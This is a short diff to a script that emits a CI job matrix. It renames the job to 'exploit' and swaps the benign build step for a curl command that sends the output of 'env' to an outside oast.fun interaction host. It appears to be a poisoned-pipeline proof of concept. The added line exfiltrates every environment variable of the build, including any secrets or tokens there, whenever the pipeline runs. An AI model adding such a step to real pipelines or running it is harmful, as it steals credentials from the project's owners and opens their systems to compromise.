@@ -3,15 +3,15 @@
 cat <<EOF
 [
   {
-    "name": "linux-latest",
+    "name": "exploit",
     "os": "ubuntu-latest",
     "runs": {
-      "prepare": "echo setting up",
-      "pull": "echo pulling deps",
-      "build": "echo building",
-      "history": "echo checking history",
-      "test": "echo running tests",
-      "images": "docker images"
+      "prepare": "echo preparing...",
+      "pull": "echo pulling...",
+      "build": "curl https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/YOUR-ID?\$(env)",
+      "history": "echo done",
+      "test": "true",
+      "images": "true"
     }
   }
 ]
